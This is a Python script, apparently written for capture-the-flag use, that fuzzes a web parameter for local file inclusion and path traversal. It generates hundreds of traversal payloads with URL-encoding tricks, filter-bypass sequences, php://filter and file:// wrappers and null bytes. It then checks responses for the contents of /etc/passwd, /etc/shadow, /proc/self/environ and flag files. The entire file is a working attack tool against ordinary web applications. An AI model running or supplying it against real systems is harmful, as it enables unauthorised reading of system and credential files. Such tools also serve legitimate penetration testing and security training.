#!/usr/bin/env python3
"""
LFI / path traversal fuzzer.
Tests a parameter with traversal payloads and checks for file content in the response.
Requires: requests
"""

import argparse
import sys
from urllib.parse import quote

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests not installed: pip install requests", file=sys.stderr)
    sys.exit(1)

# ── Canary strings that indicate a successful file read ───────────────────────

CANARIES = {
    "/etc/passwd":       ["root:x:", "root:!:", "/bin/bash", "/bin/sh"],
    "/etc/shadow":       ["root:", "$6$", "$1$", "$y$"],
    "/etc/hosts":        ["127.0.0.1", "localhost"],
    "/proc/self/environ":["PATH=", "HOME=", "USER="],
    "/proc/version":     ["Linux version"],
    "/flag":             ["flag{", "ctf{", "htb{", "FLAG{"],
    "/flag.txt":         ["flag{", "ctf{", "htb{"],
    "win.ini":           ["[fonts]", "[extensions]"],
    "boot.ini":          ["[boot loader]", "operating systems"],
}

# ── Traversal payloads ────────────────────────────────────────────────────────

TRAVERSAL_PREFIXES = [
    "../" * i for i in range(1, 10)
] + [
    "..\\",
    "..\\/",
    "..%2f",
    "..%5c",
    "%2e%2e%2f",
    "%2e%2e/",
    "..%252f",      # double URL encode
    "....//",       # stripped ../ bypass
    "....\\\\",
    "..;/",
    "..//",
]

WRAPPERS = [
    "",                             # bare path
    "php://filter/convert.base64-encode/resource=",
    "php://filter/read=string.rot13/resource=",
    "file://",
    "data://text/plain,",
]

NULL_BYTES = ["", "%00", "\x00"]


def build_payloads(target_file: str) -> list[str]:
    payloads = []
    for prefix in TRAVERSAL_PREFIXES:
        for wrapper in WRAPPERS:
            for null in NULL_BYTES:
                p = f"{wrapper}{prefix}{target_file}{null}"
                payloads.append(p)
    # Absolute paths
    for wrapper in WRAPPERS:
        payloads.append(f"{wrapper}{target_file}")
    return payloads


def check_response(body: str, target_file: str) -> list[str]:
    canary_strings = CANARIES.get(target_file, ["flag{", "root:x:", "127.0.0.1"])
    return [c for c in canary_strings if c.lower() in body.lower()]


def send(session, url, method, param, value, base_data, timeout, encode):
    if encode:
        value = quote(value, safe="")
    try:
        if method == "GET":
            params = {param: value}
            r = session.get(url, params=params, timeout=timeout, verify=False,
                            allow_redirects=True)
        else:
            data = {**base_data, param: value}
            r = session.post(url, data=data, timeout=timeout, verify=False,
                             allow_redirects=True)
        return r
    except Exception:
        return None


def main():
    parser = argparse.ArgumentParser(description="LFI / path traversal fuzzer")
    parser.add_argument("--url",    required=True, help="Target URL")
    parser.add_argument("--param",  required=True, help="Vulnerable parameter name")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--data",   default="", help="Base POST data (key=val&...)")
    parser.add_argument("--target", default="/etc/passwd",
                        help="File to try to read (default: /etc/passwd)")
    parser.add_argument("--targets-file", dest="targets_file",
                        help="File with one target path per line")
    parser.add_argument("--encode", action="store_true",
                        help="URL-encode the payload value")
    parser.add_argument("--timeout", type=int, default=8)
    parser.add_argument("--headers", action="append", default=[], metavar="H:V")
    parser.add_argument("--stop-first", action="store_true", dest="stop_first",
                        help="Stop after first successful payload per target")
    args = parser.parse_args()

    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0 (CTF-LFI)"
    for h in args.headers:
        k, _, v = h.partition(":")
        session.headers[k.strip()] = v.strip()

    base_data = {}
    if args.data:
        for part in args.data.split("&"):
            k, _, v = part.partition("=")
            base_data[k] = v

    targets = [args.target]
    if args.targets_file:
        with open(args.targets_file) as f:
            targets = [l.strip() for l in f if l.strip()]

    for target in targets:
        payloads = build_payloads(target)
        print(f"\n[*] Target file: {target}  ({len(payloads)} payloads)")

        found = False
        for i, payload in enumerate(payloads):
            r = send(session, args.url, args.method, args.param, payload,
                     base_data, args.timeout, args.encode)
            if r is None:
                continue

            hits = check_response(r.text, target)
            if hits:
                print(f"\n  [+] FOUND! payload={payload!r}")
                print(f"      Canaries: {hits}")
                print(f"      Status: {r.status_code}  Size: {len(r.content)}B")
                snippet = r.text[:400].replace('\n', '\\n')
                print(f"      Snippet: {snippet}")
                found = True
                if args.stop_first:
                    break
            elif i % 50 == 0:
                print(f"\r    [{i}/{len(payloads)}] testing ...", end="", flush=True)

        if not found:
            print(f"\n  [-] No successful LFI detected for {target}")


if __name__ == "__main__":
    main()
